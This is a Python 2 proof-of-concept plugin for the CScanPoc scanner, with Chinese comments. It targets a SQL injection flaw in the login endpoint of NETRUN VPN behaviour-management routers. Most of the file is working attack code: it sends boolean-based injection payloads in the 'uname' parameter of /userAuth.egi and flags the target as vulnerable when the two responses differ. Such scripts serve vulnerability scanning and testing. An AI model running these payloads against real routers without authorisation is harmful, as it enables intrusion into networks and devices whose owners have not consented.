# coding:utf-8
from CScanPoc.thirdparty import requests
from CScanPoc import ABPoc, ABVuln, VulnLevel, VulnType


class Vuln(ABVuln):
    vuln_id = 'NetrunVPN_0101'  # 平台漏洞编号
    name = 'NETRUN VPN上网行为管理路由器通用型注入'  # 漏洞名称
    level = VulnLevel.HIGH  # 漏洞危害级别
    type = VulnType.INJECTION  # 漏洞类型
    disclosure_date = '2016-06-27'  # 漏洞公布时间
    desc = '''
    VPN上网行为管理路由器通用型注入漏洞，攻击者可以通过构造恶意语句来读取系统敏感文件信息。
    '''  # 漏洞描述
    ref = 'Unknown'  # 漏洞来源https://wooyun.shuimugan.com/bug/view?bug_no=207135
    cnvd_id = 'Unknown'  # cnvd漏洞编号
    cve_id = 'Unknown'  # cve编号
    product = 'NetrunVPN'  # 漏洞组件名称
    product_version = 'Unknown'  # 漏洞应用版本


class Poc(ABPoc):
    poc_id = '43db2447-7f0e-4f00-babe-9e06d00f62e7'  # 平台 POC 编号
    author = 'hyhmnn'  # POC编写者
    create_date = '2018-06-25'  # POC创建时间

    def __init__(self):
        super(Poc, self).__init__(Vuln())

    def verify(self):
        try:
            self.output.info('开始对 {target} 进行 {vuln} 的扫描'.format(
                target=self.target, vuln=self.vuln))
            url = self.target + "/userAuth.egi?uname=admin' AND 3276=3275 AND 'HmLC' ='HmLC&upwd=12345"
            url1 = self.target + "/userAuth.egi?uname=admin' AND 3276=3276 AND 'HmLC' ='HmLC&upwd=12345"
            _response = requests.get(url)
            _response1 = requests.get(url1)

            if _response.text != _response1.text and (url == _response.url or url1 == _response1.url) and (_response.status_code == 200 or _response1.status_code == 200):
                self.output.report(self.vuln, '发现{target}存在{name}漏洞'.format(
                    target=self.target, name=self.vuln.name))
        except Exception, e:
            self.output.info('执行异常：{}'.format(e))

    def exploit(self):
        self.verify()


if __name__ == '__main__':
    Poc().run()
